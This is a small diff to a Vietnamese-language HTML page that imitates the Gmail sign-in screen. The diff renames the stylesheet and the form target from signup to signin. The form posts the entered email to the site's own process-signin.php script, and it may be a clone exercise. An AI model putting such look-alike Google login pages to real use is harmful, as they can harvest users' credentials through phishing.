@@ -4,7 +4,7 @@
 <head>
     <title>Gmail Đăng nhập</title>
     <meta charset="utf-8">
-    <link rel="stylesheet" href="css/signup.css">
+    <link rel="stylesheet" href="css/signin.css">
     <!-- CSS only -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
         integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
@@ -21,7 +21,7 @@
         <h4>Đăng nhập</h4>
         <p style="margin-bottom: 8%;">để tiếp tục đến Gmail</p>
        
-        <form class="form-signin" action="process-signup.php" method="post"> 
+        <form class="form-signin" action="process-signin.php" method="post"> 
         <input type="email" id="inputEmail" name="txtEmail"   placeholder="Email hoặc số điện thoại" required>
             <p class="invalid-feedback">
                 Please provide a valid zip.
